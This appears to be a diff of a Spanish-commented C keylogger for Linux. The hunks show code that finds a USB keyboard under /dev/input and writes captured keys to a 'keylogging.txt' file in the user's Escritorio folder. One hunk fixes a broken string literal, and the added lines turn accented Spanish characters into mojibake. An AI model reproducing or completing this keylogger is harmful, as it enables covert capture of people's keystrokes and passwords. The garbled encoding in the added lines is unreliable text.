@@ -7,7 +7,7 @@
 #include <dirent.h>
 
 #define HOME_DIR getenv("HOME")
-#define LOG_FILE /Escritorio/keylogging.txt"
+#define LOG_FILE "/Escritorio/keylogging.txt"
 #define INPUT_DIR "/dev/input/"
 #define DEVICE_PATH_SIZE 512  
 
@@ -52,7 +52,7 @@ char* find_keyboard_device() {
             ioctl(fd, EVIOCGID, &device_info);
             close(fd);
 
-            // Filtrar por ID de fabricante y producto (puede variar según el teclado)
+            // Filtrar por ID de fabricante y producto (puede variar segÃºn el teclado)
             if (device_info.bustype == BUS_USB) {  // Verificar si el dispositivo es USB
                 strncpy(keyboard_device, device_path, sizeof(keyboard_device) - 1);
                 keyboard_device[sizeof(keyboard_device) - 1] = '\0';
@@ -69,7 +69,7 @@ char* find_keyboard_device() {
 int main() {
     char *device = find_keyboard_device();
     if (device == NULL) {
-        fprintf(stderr, "No se encontró un dispositivo de teclado.\n");
+        fprintf(stderr, "No se encontrÃ³ un dispositivo de teclado.\n");
         return EXIT_FAILURE;
     }
 
